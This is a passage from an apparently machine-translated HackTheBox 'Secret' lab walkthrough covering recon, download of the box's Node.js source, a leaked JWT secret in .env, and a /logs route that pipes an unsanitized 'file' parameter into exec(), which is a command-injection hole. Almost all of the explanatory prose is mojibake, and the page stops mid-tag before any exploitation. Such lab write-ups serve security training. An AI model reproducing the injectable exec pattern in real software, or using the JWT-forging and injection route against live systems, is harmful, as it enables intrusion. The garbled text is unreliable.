<html>
<head>
<title>Secret from HackTheBox â€” Detailed Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">é»‘å®¢ç›’å­çš„ç§˜å¯†â€”â€”è¯¦ç»†æ¼”ç»ƒ</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/secret-from-hackthebox-detailed-walkthrough-d256fb39a910?source=collection_archive---------0-----------------------#2022-04-21">https://infosecwriteups.com/secret-from-hackthebox-detailed-walkthrough-d256fb39a910?source=collection_archive---------0-----------------------#2022-04-21</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="75e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å±•ç¤ºå®Œæˆç›’å­æ‰€éœ€çš„æ‰€æœ‰å·¥å…·å’ŒæŠ€æœ¯ã€‚</p><h1 id="a354" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æœºå™¨ä¿¡æ¯</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/fa699f0f26860c14c32af4c6ff41e538.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*VnDcZof_GySndasR.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">é»‘å®¢ç›’å­çš„ç§˜å¯†</figcaption></figure><p id="1326" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">Secretåœ¨HackTheBoxä¸Šè¢«è¯„ä¸ºç®€æ˜“æœºã€‚æˆ‘ä»¬ä»è¿è¡Œåœ¨æœºå™¨ä¸Šçš„ç½‘ç«™ä¸Šæ‰¾åˆ°çš„å¤‡ä»½å¼€å§‹ã€‚åœ¨é‚£é‡Œï¼Œæˆ‘ä»¬å‘ç°äº†è®¸å¤šæœ‰è¶£çš„æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶å¼•å¯¼æˆ‘ä»¬ä¸APIè¿›è¡Œäº¤äº’ã€‚æœ€ç»ˆï¼Œæˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªJSON Webä»¤ç‰Œï¼Œå¹¶å¯ä»¥æ‰§è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œï¼Œæˆ‘ä»¬ç”¨å®ƒæ¥è·å¾—ä¸€ä¸ªåå‘shellã€‚å‡çº§åˆ°rootæ¶‰åŠè¿›ä¸€æ­¥çš„ä»£ç å®¡æŸ¥ï¼Œè¿™æ¬¡æ˜¯åœ¨åŒ…è£…ç›’ä¸Šæ‰¾åˆ°çš„cç¨‹åºã€‚ç”±æ­¤æˆ‘ä»¬å‘ç°å´©æºƒç¨‹åºå…è®¸æˆ‘ä»¬é€šè¿‡æ ¸å¿ƒè½¬å‚¨çœ‹åˆ°å†…å­˜çš„å†…å®¹ã€‚åœ¨é‚£é‡Œæˆ‘ä»¬å¯ä»¥æ£€ç´¢æ ¹æ ‡å¿—ã€‚</p><p id="366f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€éœ€æŠ€èƒ½æ˜¯å¯¹Javaä»£ç çš„åŸºæœ¬ç†è§£ã€‚å­¦åˆ°çš„æŠ€èƒ½æ˜¯æ“çºµJSON Webä»¤ç‰Œå’Œæ£€æŸ¥æ•æ„Ÿä¿¡æ¯çš„æ ¸å¿ƒè½¬å‚¨ã€‚</p><div class="lv lw gp gr lx ly"><a href="https://www.hackthebox.eu/home/machines/profile/408" rel="noopener  ugc nofollow" target="_blank"><div class="lz ab fo"><div class="ma ab mb cl cj mc"><h2 class="bd ir gy z fp md fr fs me fu fw ip bi translated">ç§˜å¯†â€”â€”ç ´è§£ç›’å­::æ¸—é€æµ‹è¯•å®éªŒå®¤</h2><div class="mf l"><h3 class="bd b gy z fp md fr fs me fu fw dk translated">ç™»å½•Hack The Boxå¹³å°ï¼Œè®©æ‚¨çš„ç¬”æµ‹è¯•å’Œç½‘ç»œå®‰å…¨æŠ€èƒ½æ›´ä¸Šä¸€å±‚æ¥¼ï¼</h3></div><div class="mg l"><p class="bd b dl z fp md fr fs me fu fw dk translated">www.hackthebox.eu</p></div></div><div class="mh l"><div class="mi l mj mk ml mh mm lp ly"/></div></div></a></div><h1 id="da25" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">åˆæ­¥ä¾¦å¯Ÿ</h1><p id="d2b7" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">åƒå¾€å¸¸ä¸€æ ·ï¼Œè®©æˆ‘ä»¬ä»Nmapå¼€å§‹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ms"><img src="../Images/c070e7e8ad1884f13a78ff565eab458a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N-JQxJWymfnWTCJpWetydg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ç›’å­çš„Nmapæ‰«æ</figcaption></figure><p id="ee3c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åªæœ‰ä¸‰ä¸ªå¼€æ”¾çš„ç«¯å£ï¼Œæœ‰è¶£çš„æ˜¯å…¶ä¸­ä¸¤ä¸ªæ˜¯nginxã€‚è®©æˆ‘ä»¬å…ˆå°†box IPæ·»åŠ åˆ°hostsæ–‡ä»¶ä¸­:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="805e" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret]<br/>â””â”€# echo "10.10.11.120 secret.htb" &gt;&gt; /etc/hosts</span></pre><h1 id="fae8" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ç½‘ç«™(å…¨çƒèµ„è®¯ç½‘çš„ä¸»æœºç«™)</h1><p id="f5d4" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">ç°åœ¨çœ‹çœ‹ç«¯å£80ä¸Šçš„ç½‘ç«™:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nh"><img src="../Images/49d93c04ba4d51d990940dddba0c6018.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*1vSnLxsisbcokAWn.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">æ–‡æ¡£çš„å“‘æ–‡æ¡£ç½‘ç«™</figcaption></figure><p id="4e25" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™é‡Œæ²¡ä»€ä¹ˆï¼Œåªæ˜¯ä¸€ä¸ªå…³äºæ–‡æ¡£çš„é™æ€ç«™ç‚¹ã€‚ç‚¹å‡»ç°åœºæ¼”ç¤ºæŒ‰é’®ï¼Œæˆ‘ä»¬å°†è¿›å…¥ä»¥ä¸‹é¡µé¢:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi ni"><img src="../Images/918bb0e84401183b7109c028f1f396a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:878/format:webp/0*Ns4Oy1MfQvzpW__e.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">åœ¨ç§˜å¯†ç›’å­ä¸Šå‘ç°çš„API</figcaption></figure><p id="843d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ªAPIï¼Œç¨åæˆ‘ä»¬å°†ä¸ä¹‹äº¤äº’ã€‚åœ¨ä¸»é¡µä¸‹æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸€ä¸ªä¸‹è½½æºä»£ç çš„é“¾æ¥:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nj"><img src="../Images/700c82979d305341e1db71ad16d98a92.png" data-original-src="https://miro.medium.com/v2/resize:fit:1290/format:webp/0*fW9wo_M9CVKSqoU0.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">ä¸‹è½½æºä»£ç çš„é“¾æ¥</figcaption></figure><h1 id="21c8" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æºä»£ç å®¡æŸ¥</h1><p id="adb6" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">è®©æˆ‘ä»¬æŠ“ä½å®ƒçœ‹ä¸€çœ‹:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f857" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret]<br/>â””â”€# wget http://secret.htb/download/files.zip<br/>--2021-11-18 21:35:40--  http://secret.htb/download/files.zip<br/>Resolving secret.htb (secret.htb)... 10.10.11.120<br/>Connecting to secret.htb (secret.htb)|10.10.11.120|:80... connected.<br/>HTTP request sent, awaiting response... 200 OK<br/>Length: 28849603 (28M) [application/zip]<br/>Saving to: â€˜files.zipâ€™<br/>files.zip      100%[================&gt;]  27.51M  2.74MB/s    in 9.8s    <br/>2021-11-18 21:35:50 (2.81 MB/s) - â€˜files.zipâ€™ saved [28849603/28849603]<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret]<br/>â””â”€# unzip files.zip<br/>Archive:  files.zip<br/>   creating: local-web/<br/>   creating: local-web/node_modules/<br/>   creating: local-web/node_modules/get-stream/<br/>  inflating: local-web/node_modules/get-stream/buffer-stream.js  <br/>&lt;SNIP&gt;<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret]<br/>â””â”€# cd local-web<br/><br/>â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret/local-web]<br/>â””â”€# ls -lsa<br/> 4 -rw-rw-r--   1 root root    72 Sep  3 06:59 .env<br/> 4 drwxrwxr-x   8 root root  4096 Sep  8 19:33 .git<br/> 4 -rw-rw-r--   1 root root   885 Sep  3 06:56 index.js<br/> 4 drwxrwxr-x   2 root root  4096 Aug 13 05:42 model<br/> 4 drwxrwxr-x 201 root root  4096 Aug 13 05:42 node_modules<br/> 4 -rw-rw-r--   1 root root   491 Aug 13 05:42 package.json<br/>68 -rw-rw-r--   1 root root 69452 Aug 13 05:42 package-lock.json<br/> 4 drwxrwxr-x   4 root root  4096 Sep  3 06:54 public<br/> 4 drwxrwxr-x   2 root root  4096 Sep  3 07:32 routes<br/> 4 drwxrwxr-x   4 root root  4096 Aug 13 05:42 src<br/> 4 -rw-rw-r--   1 root root   651 Aug 13 05:42 validations.js</span></pre><p id="fd21" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨æœ¬åœ°ç½‘ç»œæ–‡ä»¶å¤¹ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°è®¸å¤šæ–‡ä»¶ã€‚æˆ‘çœ‹åˆ°çš„ç¬¬ä¸€ä¸ªæ˜¯ã€‚ç¯å¢ƒ:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="af50" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret/local-web]<br/>â””â”€# cat .env          <br/>DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'<br/>TOKEN_SECRET = secret</span></pre><p id="58de" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä¸çŸ¥é“è¿™æ˜¯ä¸ºäº†ä»€ä¹ˆï¼Œä½†ä¼¼ä¹å¾ˆå¯ç–‘ï¼</p><p id="8a94" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æŸ¥çœ‹index.jsï¼Œæˆ‘ä»¬ä¼šå‘ç°ä¸€äº›æœ‰è¶£çš„äº‹æƒ…:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nk"><img src="../Images/61fc83d620114687e2b499d38e04cde0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_HjZ6jjiGpE2M0ZXsaKrVA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">index.jsçš„å†…å®¹</figcaption></figure><p id="2ddb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æœ‰ä¸€ä¸ªåä¸ºauthçš„æ–‡ä»¶ç”¨äºè®¾ç½®åä¸ºauthRouteçš„åº”ç”¨ç¨‹åºï¼Œå®ƒçœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªæˆ‘ä»¬å¯ä»¥è¿æ¥çš„APIç«¯ç‚¹ã€‚</p><p id="8fb6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æŸ¥çœ‹auth.jsæ–‡ä»¶ï¼Œæˆ‘ä»¬çœ‹åˆ°ä¸€ä¸ªæ³¨å†Œç«¯ç‚¹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nl"><img src="../Images/9a16c2f369bbb882bc42c9769fac4e53.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oRnEfNpWLU7DOuJ2HaZNhA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">å†…å®¹è®¤è¯</figcaption></figure><p id="fb38" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿˜æœ‰ä¸€ä¸ªç™»å½•éƒ¨åˆ†ï¼Œå®ƒæ£€æŸ¥ä¸€ä¸ªå¸æˆ·ï¼Œå¦‚æœæœ‰æ•ˆï¼Œå°±åˆ›å»ºä¸€ä¸ªJSON Webä»¤ç‰Œ(JWT ):</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nm"><img src="../Images/a2f76dfc69cabbcc3d58aacb09d7cddc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*KiMcdORCMzUsCjvJnwV81A.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">auth.jsçš„æ›´å¤šå†…å®¹</figcaption></figure><p id="a29d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿˜æœ‰ä¸€ä¸ªvalidation.jsæ–‡ä»¶ï¼Œå®ƒæ£€æŸ¥ç”¨æˆ·çš„æ³¨å†Œå’Œç™»å½•æ˜¯å¦æœ‰æ•ˆã€‚å¦‚æœä½ éœ€è¦åœ¨æ·±å…¥ä¹‹å‰é˜…è¯»ä¸€äº›èµ„æ–™ï¼Œè¿™ç¯‡æ–‡ç« æ˜¯å¯¹JWTçš„å¾ˆå¥½ä»‹ç»ã€‚</p><h1 id="979d" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">ä¸APIäº¤äº’</h1><p id="b677" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æ ¹æ®é…ç½®æ–‡ä»¶ä¸­çš„ä¿¡æ¯ï¼Œæˆ‘ä»¬ç°åœ¨çŸ¥é“å¦‚ä½•å°è¯•åˆ›å»ºæˆ‘ä»¬è‡ªå·±çš„ç”¨æˆ·:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi no"><img src="../Images/455b4f640abcd818d11b8c53d6bf3a99.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FVGoIgKWGJy3C6--qj7LcA.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">é€šè¿‡ç¼ºå°‘ç”µå­é‚®ä»¶çš„APIåˆ›å»ºç”¨æˆ·</figcaption></figure><p id="f8c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¯•å›¾æ³¨å†Œä¸€ä¸ªåªæœ‰å§“åå­—æ®µçš„ç”¨æˆ·ï¼Œä¼šè¿”å›ä¸€æ¡æ¶ˆæ¯è¯´éœ€è¦ç”µå­é‚®ä»¶ã€‚è®©æˆ‘ä»¬å†è¯•ä¸€æ¬¡ï¼Œæ·»åŠ ä¸€ä¸ªå‡åœ°å€:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi np"><img src="../Images/39676983cea262559db5a648b8050ab7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FlD2PFUMD5N41hN8MUwBgg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">é€šè¿‡ç¼ºå°‘å¯†ç çš„APIåˆ›å»ºç”¨æˆ·</figcaption></figure><p id="4baf" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆåŠŸäº†ï¼Œæˆ‘ä»¬ç°åœ¨å¾—åˆ°å¦ä¸€æ¡æ¶ˆæ¯ï¼Œè¿™æ¬¡å‘Šè¯‰æˆ‘ä»¬æä¾›ä¸€ä¸ªå¯†ç ã€‚è®©æˆ‘ä»¬ç”¨å¯†ç å†è¯•ä¸€æ¬¡:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nq"><img src="../Images/705b9117694dabf943ac088dec707d0b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ThoCxHBkbPQDes22n0lpVw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">é€šè¿‡ç¼ºå°‘å¯†ç çš„APIåˆ›å»ºç”¨æˆ·</figcaption></figure><p id="36da" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ ¹æ®æä¾›çš„ä¸‰ä¸ªå¿…éœ€å‚æ•°ï¼Œæˆ‘ä»¬å·²ç»åˆ›å»ºäº†ç”¨æˆ·ã€‚ç°åœ¨æˆ‘ä»¬å¯ä»¥å°è¯•ç”¨å®ƒç™»å½•:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nr"><img src="../Images/db95a027cdefaf49b34483f96f256963.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aZVb2AzNYtvN0Ck5f7j8tg.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">å‘æ–°åˆ›å»ºçš„ç”¨æˆ·éªŒè¯</figcaption></figure><h1 id="1245" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">æ›´å¤šä»£ç å®¡æŸ¥</h1><p id="b066" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">è¿™å¾ˆæœ‰æ•ˆï¼Œæ­£å¦‚æˆ‘ä»¬åœ¨é…ç½®æ–‡ä»¶ä¸­çœ‹åˆ°çš„ï¼Œæˆ‘ä»¬çš„ç”¨æˆ·è¿”å›äº†ä¸€ä¸ªJWTã€‚åœ¨å†æ¬¡æŸ¥çœ‹æºä»£ç åï¼Œæˆ‘åœ¨routesæ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°äº†private.js:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3bd8" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret/local-web]<br/>â””â”€# cat routes/private.js <br/>const router = require('express').Router();<br/>const verifytoken = require('./verifytoken')<br/>const User = require('../model/user');<br/><br/>router.get('/priv', verifytoken, (req, res) =&gt; {<br/>   // res.send(req.user)<br/>    const userinfo = { name: req.user }<br/>    const name = userinfo.name.name;<br/>    if (name == 'theadmin'){<br/>        res.json({<br/>            creds:{<br/>                role:"admin", <br/>                username:"theadmin",<br/>                desc : "welcome back admin,"<br/>            }<br/>        })<br/>    }<br/>    else{<br/>        res.json({<br/>            role: {<br/>                role: "you are normal user",<br/>                desc: userinfo.name.name<br/>            }<br/>        })<br/>    }<br/>})</span></pre><p id="b575" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">è¿™ä¸ºæˆ‘ä»¬æä¾›äº†å¦ä¸€ä¸ªåä¸º/privçš„ç«¯ç‚¹ã€‚æœ‰è¶£çš„æ˜¯ï¼Œå®ƒå‘Šè¯‰æˆ‘ä»¬ï¼Œå¦‚æœæˆ‘ä»¬æ‹¥æœ‰ç”¨æˆ·åtheadminå¹¶æä¾›æœ‰æ•ˆçš„ä»¤ç‰Œï¼Œæˆ‘ä»¬å°±æ‹¥æœ‰ç®¡ç†å‘˜è§’è‰²ï¼Œå¦åˆ™æˆ‘ä»¬å°±æ˜¯æ™®é€šç”¨æˆ·ã€‚</p><p id="b8d9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç¨åï¼Œåœ¨åŒä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ªåä¸º/logsçš„ç«¯ç‚¹ï¼Œå¦‚æœæˆ‘ä»¬æ˜¯ç®¡ç†å‘˜ç”¨æˆ·ï¼Œå®ƒå°†å…è®¸æˆ‘ä»¬ä¼ é€’ä¸€ä¸ªåä¸ºfileçš„å‚æ•°ï¼Œè¯¥å‚æ•°æ˜¯æœªæ¸…ç†çš„:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="684d" class="nc km iq my b gy nd ne l nf ng">router.get('/logs', verifytoken, (req, res) =&gt; {<br/>    const file = req.query.file;<br/>    const userinfo = { name: req.user }<br/>    const name = userinfo.name.name;<br/>    <br/>    if (name == 'theadmin'){<br/>        const getLogs = `git log --oneline ${file}`;<br/>        exec(getLogs, (err , output) =&gt;{<br/>            if(err){<br/>                res.status(500).send(err);<br/>                return<br/>            }<br/>            res.json(output);<br/>        })<br/>    }<br/>    else{<br/>        res.json({<br/>            role: {<br/>                role: "you are normal user",<br/>                desc: userinfo.name.name<br/>            }<br/>        })<br/>    }<br/>})</span></pre><p id="f526" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å› æ­¤ï¼Œå¾ˆæ˜æ˜¾ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥ä¸ºtheadminç”¨æˆ·è·å–æœ‰æ•ˆçš„JWTã€‚é¦–å…ˆï¼Œè®©æˆ‘ä»¬å°è¯•å°†æˆ‘ä»¬è‡ªå·±çš„ç”¨æˆ·ä»¤ç‰Œå‘é€åˆ°æˆ‘ä»¬åˆšåˆšæ‰¾åˆ°çš„/privç«¯ç‚¹:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="346f" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret]<br/>â””â”€# curl http://secret.htb/api/priv -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTk2Y2RjZTQyNTczNjA0NWMyYjI5NTgiLCJuYW1lIjoicGVuY2VyIiwiZW1haWwiOiJwZW5jZXJAdGVzdC5jb20iLCJpYXQiOjE2MzcyNzMwOTN9.iVtsUPT-D-uHBCNnTIsRRAPyvLQSI5mIEvYqn9JJzLk'<br/>{"role":{"role":"you are normal user","desc":"pencer"}}</span></pre><p id="ecb4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æœ‰äº†è¿™ä¸ªè®¤è¯ä»¤ç‰Œï¼Œæˆ‘ä»¬å¯ä»¥ä¸priv APIè¿›è¡Œäº¤äº’ï¼Œä½†æ˜¯ä½œä¸ºä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼Œæˆ‘ä»¬ä¸èƒ½åšå¾ˆå¤šäº‹æƒ…ã€‚</p><h1 id="6e39" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">JWTå·¥å…·</h1><p id="9a79" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">æˆ‘ä»¬å¯ä»¥ç”¨JWT _å·¥å…·è§£ç JWTï¼Œè®©æˆ‘ä»¬å¾—åˆ°å®ƒ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi ns"><img src="../Images/81c16641e7a97a3ff006453f9d97ef6e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*65VKvqYO0USK7hNPzJd71g.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">è·å–jwt_toolçš„æœ€æ–°ç‰ˆæœ¬</figcaption></figure><p id="51c2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬å°†ä½œä¸ºç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·æ”¶åˆ°çš„JWTä¼ é€’ç»™å®ƒ:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nt"><img src="../Images/fe44d7258744dea980ecea613bd20b73.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ogbor4L12_hcKntzfTHXqw.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">è§£ç JWTä»¥æŸ¥çœ‹å†…å®¹</figcaption></figure><p id="0ff8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å®ƒè§£ç äº†ä»¤ç‰Œï¼Œå¹¶å‘æˆ‘ä»¬æ˜¾ç¤ºç”±_idã€åç§°å’Œç”µå­é‚®ä»¶ç»„æˆçš„æœ‰æ•ˆè½½è·ã€‚</p><p id="2e92" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å›é¡¾æˆ‘ä»¬ç›®å‰çš„å‘ç°ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œè¦å–å¾—è¿›å±•ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ç§ä¸ºç®¡ç†å‘˜ç”¨æˆ·ç”Ÿæˆä»¤ç‰Œçš„æ–¹æ³•ã€‚ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¯†ç ï¼Œæˆ‘ä»¬ä¹‹å‰å‘ç°äº†è¿™ä¸ª:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="3ff4" class="nc km iq my b gy nd ne l nf ng">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/secret/local-web]<br/>â””â”€# cat .env          <br/>DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'<br/>TOKEN_SECRET = secret</span></pre><h1 id="2664" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">GitTools</h1><p id="39b5" class="pw-post-body-paragraph jn jo iq jp b jq mn js jt ju mo jw jx jy mp ka kb kc mq ke kf kg mr ki kj kk ij bi translated">è¿™æ˜¯è¡Œä¸é€šçš„ï¼Œä½†æ˜¯æœ‰ä¸€ç‚¹æˆ‘ä»¬ä¹‹å‰æ²¡æœ‰æ³¨æ„åˆ°ã€‚gitæ–‡ä»¶å¤¹åŒ…å«åœ¨åŸå§‹ä¸‹è½½ä¸­ã€‚è®©æˆ‘ä»¬æå–çš„å†…å®¹ã€‚ä½¿ç”¨GitToolsçš„git:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="mt mu di mv bf mw"><div class="gh gi nu"><img 